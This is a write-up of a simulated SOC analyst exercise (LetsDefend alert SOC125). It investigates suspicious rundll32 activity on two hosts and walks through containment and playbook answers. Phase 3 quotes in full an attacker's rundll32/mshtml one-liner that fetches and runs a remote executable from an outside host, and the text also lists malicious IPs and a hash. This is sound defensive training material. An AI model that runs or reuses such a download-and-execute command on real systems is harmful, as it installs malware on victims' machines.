@@ -1,0 +1,74 @@
+🚨 Alert SOC125 - Suspicious Rundll32 Activity
+** SEVERITY: HIGH** | **STATUS: TRUE POSITIVE** | **TARGET: `emilycomp` (`172.16.17.49`) && `MikeComputer` (`172.16.17.14`) **
+
+
+                                                        ## 🟢 Overview & Metadata
+
+EventID: 58
+Event Time: 2021-02-14T12:13:34+03:00
+Rule: SOC125 - Suspicious Rundll32 Activity
+Role: Security Analyst
+Alert Type: Malware
+Difficulty: Medium
+MITRE ATT&CK: T1204
+File Hash: a4513379dad5233afa402cc56a8b9222
+File Name: KBDYAK.exe
+File Size: 848.00 Kb
+Device Action: Allowed
+Source Address: 172.16.17.49
+Source Hostname: EmilyComp
+
+
+
+
+
+                                                        ## 🔍 Step-by-Step Investigation Timeline
+
+
+-Phase 1: Check the hash in VirusTotal. It's considered malware by 60 of 70 antivirus. 
+
+
+-Phase 2: Contain the machine EmilyComp.
+
+
+-Phase 3: Check commands executed. We can see that the attacker used a command through legitimate processes. The timestamp is 14-02-2021 12:12.
+rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')'
+
+
+-Phase 4: We check which IP has been connected at that time. Which IP is 67.68.210.95, which IP is considered malicious by 9 antivirus in VirusTotal.
+
+
+-Phase 5: We check in log management if there have been lateral movement by any case. There is a connection between MikeComputer and this IP, accessing a suspicious link. 
+
+
+-Phase 6: Proceed to contain MykeComputer machine. 
+
+
+-Phase 7: Check commands executed in MykeComputer machine. It executed a powershell to download malware and then execute it if suceeds.
+
+
+-Phase 8: Check the logs management to check which connections have been made. It shows another IP which VirusTotal consider malicious 162.241.242.173. It doesn't show another connection
+to the network with that IP so we can say it was just to download malware.
+
+
+
+
+                                                        ## 📋 Let's Defend Playbook Resolution
+
+    1-Choose threat indicator.
+Unknown or unexpected outgoing internet traffic.
+
+
+    2-Malware quarantined/cleaned?
+Quarantined
+
+
+    3-Analyze Malware
+Malicious
+
+
+    4-Check If Someone Requested the C2
+Accessed
+
+
+Correction: In question number 2 the malware is not quarantined, we contained the system but the firewall didn't quarantined it.
